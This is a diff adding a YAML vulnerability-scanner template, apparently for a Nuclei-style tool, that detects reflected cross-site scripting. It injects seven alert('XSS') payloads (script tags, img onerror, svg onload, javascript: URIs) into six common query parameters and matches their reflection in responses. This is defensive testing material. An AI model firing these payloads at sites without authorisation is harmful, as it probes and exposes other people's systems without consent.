@@ -1,0 +1,41 @@
+# Reflected XSS Detection Module
+
+id: xss-reflected
+info:
+  name: Reflected XSS Detection
+  author: sif
+  severity: medium
+  description: Detects reflected Cross-Site Scripting vulnerabilities
+  tags: [xss, injection, javascript, owasp-top10]
+
+type: http
+
+http:
+  method: GET
+  paths:
+    - "{{BaseURL}}/?q={{payload}}"
+    - "{{BaseURL}}/?search={{payload}}"
+    - "{{BaseURL}}/?name={{payload}}"
+    - "{{BaseURL}}/?input={{payload}}"
+    - "{{BaseURL}}/?message={{payload}}"
+    - "{{BaseURL}}/?text={{payload}}"
+
+  payloads:
+    - "<script>alert('XSS')</script>"
+    - "'><script>alert('XSS')</script>"
+    - "\"><script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg onload=alert('XSS')>"
+    - "javascript:alert('XSS')"
+    - "<body onload=alert('XSS')>"
+
+  threads: 10
+
+  matchers:
+    - type: word
+      part: body
+      words:
+        - "<script>alert('XSS')</script>"
+        - "<img src=x onerror=alert('XSS')>"
+        - "<svg onload=alert('XSS')>"
+      condition: or
